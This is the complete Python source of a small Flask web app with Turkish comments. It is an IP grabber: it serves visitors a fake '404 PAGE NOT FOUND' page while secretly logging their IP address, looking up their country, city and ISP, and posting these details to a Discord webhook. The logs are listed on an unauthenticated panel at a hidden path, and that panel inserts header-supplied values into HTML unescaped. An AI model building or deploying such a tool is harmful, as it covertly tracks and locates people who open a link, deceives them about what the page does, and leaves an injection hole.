from flask import Flask, request
import sqlite3
from datetime import datetime, timedelta
import requests
import os

app = Flask(__name__)

# 🔐 Discord webhook (Render ENV'den alınır)
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")

# DB
def init_db():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            ulke TEXT,
            sehir TEXT,
            isp TEXT,
            tarih TEXT,
            saat TEXT,
            timestamp DATETIME
        )
    """)
    conn.commit()
    conn.close()

init_db()


# IP info
def ip_bilgi(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3)
        d = r.json()
        if d["status"] == "success":
            return d["country"], d["city"], d["isp"]
    except:
        pass
    return "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"


# 30 dk kontrol
def son_30dk(ip):
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("SELECT timestamp FROM logs WHERE ip=? ORDER BY id DESC LIMIT 1", (ip,))
    row = c.fetchone()
    conn.close()

    if not row:
        return False

    last = datetime.fromisoformat(row[0])
    return datetime.now() - last < timedelta(minutes=30)


# LOG
def ekle(ip):
    if son_30dk(ip):
        return

    now = datetime.now()
    ulke, sehir, isp = ip_bilgi(ip)

    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("""
        INSERT INTO logs (ip, ulke, sehir, isp, tarih, saat, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (ip, ulke, sehir, isp,
          now.strftime("%Y-%m-%d"),
          now.strftime("%H:%M:%S"),
          now.isoformat()))
    conn.commit()
    conn.close()

    # Discord log
    if DISCORD_WEBHOOK:
        try:
            requests.post(DISCORD_WEBHOOK, json={
                "content": f"📡 Ziyaret\nIP: {ip}\nÜlke: {ulke}\nŞehir: {sehir}\nISP: {isp}\nSaat: {now.strftime('%H:%M:%S')}"
            })
        except:
            pass


# HOME (404)
@app.route("/")
def home():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = ip.split(",")[0].strip()

    ekle(ip)

    return """
    <body style="background:black;color:white;text-align:center;font-family:monospace;padding-top:100px;">
        <h1>404</h1>
        <p>PAGE NOT FOUND</p>
        <small style="color:gray;">
            The requested URL was not found on this server.<br>
            Please check the URL or try again later.
        </small>
    </body>
    """, 404


# ADMIN PANEL
@app.route("/rexa/1103")
def admin():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("SELECT ip, ulke, sehir, isp, tarih, saat FROM logs ORDER BY id DESC")
    data = c.fetchall()
    conn.close()

    html = """
    <html>
    <head>
        <meta http-equiv="refresh" content="5">
        <style>
            body { background:#0a0a0a; color:#00ff00; font-family:monospace; padding:20px; }
            .box { border-bottom:1px solid #222; padding:10px; }
            .ip { color:#00ffcc; }
        </style>
    </head>
    <body>
    <h2>ADMIN PANEL</h2>
    """

    for i in data:
        html += f"""
        <div class="box">
            <div class="ip">IP: {i[0]}</div>
            <div>Ülke: {i[1]} | Şehir: {i[2]}</div>
            <div>ISP: {i[3]}</div>
            <div>{i[4]} {i[5]}</div>
        </div>
        """

    html += "</body></html>"
    return html


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
